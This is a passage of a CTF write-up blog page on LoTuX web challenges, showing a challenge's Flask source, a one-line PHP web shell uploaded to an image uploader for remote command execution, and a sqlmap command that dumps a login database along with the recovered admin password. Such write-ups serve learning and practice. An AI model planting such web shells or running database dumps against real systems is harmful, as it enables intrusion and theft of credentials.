open(&#x27;/proc/sys/kernel/random/boot_id&#x27;) as f:</span><br><span class="line">            hint = f.readline().strip()</span><br><span class="line">    except:</span><br><span class="line">        hint = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    return &#123;&quot;FLAG1&quot;: &quot;LoTuX&#123;Wh4t_k1nD_oF_vUln3rabIli7y_fr0m_tHe_l@st_c3ntUrY_i5_thi$?!&#125;&quot;, &quot;Hint&quot;: hint&#125;</span><br><span class="line"></span><br><span class="line">app.run(&quot;0.0.0.0&quot;, 20007, debug=True)</span><br></pre></td></tr></table></figure>
+<p>I got the flag, and also the path <code>&#39;/1d538e83d6f6b08f&#39;</code> to exploit boot id for <strong>Blank Site 2</strong>.</p>
+<h2 id="Image-Uploader-1"><a href="#Image-Uploader-1" class="headerlink" title="Image Uploader 1"></a>Image Uploader 1</h2><p>An image upload web app, just sent a php backdoor XD.  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>I just visited the path and got rce, with simple observation I found out flag.txt(it was at there but now deleted by some auful challengers):</p>
+<h2 id="How2Login"><a href="#How2Login" class="headerlink" title="How2Login"></a>How2Login</h2><p>Ah, my first thouhgt was like, “well…just a sql injection bypass with 300 points(?!)”.<br>Nope haha, so I opened my owasp and glimpse a path called test.php<br>(p.s. It could be found out with <code>dirsearch</code> but my owasp tool did this first XD)<br>And it was a site to check if user exist, and the link was just like this:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lotuxctf.com:20010/test.php?username=admin</span><br></pre></td></tr></table></figure>
+<p>SQL Injection!!!<br>I opened sqlmap and used the payload:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://lotuxctf.com:20010/test.php?username=admin --dump</span><br></pre></td></tr></table></figure>
+<p>And it was an Error-BASE SQL Injection and the data was hashed by sha256, but a weak password XD<br>data dumped:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">account: admin</span><br><span class="line">password: P@ssW0rd</span><br></pre></td></tr></table></figure>
+<p>Cute Flag: LoTuX{Inj3ct1on&amp;HAAAsh}  </p>
+<h2 id="THE-EYE-2"><a href="#THE-EYE-2" class="headerlink" title="THE EYE 2"></a>THE EYE 2</h2><h2 id="Blank-Site-2"><a href="#Blank-Site-2" class="headerlink" title="Blank Site 2"></a>Blank Site 2</h2>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML"><span class="toc-number">2.1.</span> <span class="toc-text">HTML</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Usefull-tools"><span class="toc-number">2.2.</span> <span class="toc-text">Usefull tools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trending-Cats"><span class="toc-number">2.3.</span> <span class="toc-text">Trending Cats</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forum"><span class="toc-number">2.4.</span> <span class="toc-text">forum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Stealer"><span class="toc-number">2.5.</span> <span class="toc-text">Cookie Stealer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LoTuX-CTF-Min-0"><span class="toc-number">2.6.</span> <span class="toc-text">LoTuX CTF Min 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LoTuX-CTF-Min-1"><span class="toc-number">2.7.</span> <span class="toc-text">LoTuX CTF Min 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blank-Site-1"><span class="toc-number">2.8.</span> <span class="toc-text">Blank Site 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Image-Uploader-1"><span class="toc-number">2.9.</span> <span class="toc-text">Image Uploader 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How2Login"><span class="toc-number">2.10.</span> <span class="toc-text">How2Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#THE-EYE-2"><span class="toc-number">2.11.</span> <span class="toc-text">THE EYE 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blank-Site-2"><span class="toc-number">2.12.</span> <span class="toc-text">Blank Site 2</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/09/20/lotuxctf-web/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&text=LoTuX CTF WriteUp-Web"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&is_video=false&description=LoTuX CTF WriteUp-Web"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LoTuX CTF WriteUp-Web&body=Check out this article: http://wha13.github.io/2023/09/20/lotuxctf-web/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&name=LoTuX CTF WriteUp-Web&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/09/20/lotuxctf-web/&t=LoTuX CTF WriteUp-Web"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
